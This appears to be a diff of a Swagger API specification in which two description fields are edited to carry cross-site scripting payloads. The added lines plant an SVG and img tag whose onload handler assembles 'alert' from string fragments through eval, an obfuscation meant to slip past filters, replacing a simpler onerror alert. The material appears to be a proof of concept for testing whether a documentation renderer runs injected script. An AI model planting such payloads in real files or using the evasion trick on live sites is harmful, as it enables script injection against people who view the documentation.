@@ -2,7 +2,8 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <svg><p><!----><img src="https://ttesttest.com/favicon.ico" onerror=alert("asdas")></svg>
+    <svg><p><!----><img src="https://act.wintershalldea.no/favicon.ico"
+onload=eval[tests=eval,tests(`ale`+`rt`)(document.URL)] ></svg>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +29,8 @@ paths:
     delete:
       parameters:
         - description: |
-            <svg><p><!----><img src="https://ttesttest.com/favicon.ico" onerror=alert("asdas")></svg>
+            <svg><p><!----><img src="https://act.wintershalldea.no/favicon.ico"
+onload=eval[tests=eval,tests(`ale`+`rt`)(document.URL)] ></svg>
 
           format: int64
           in: path
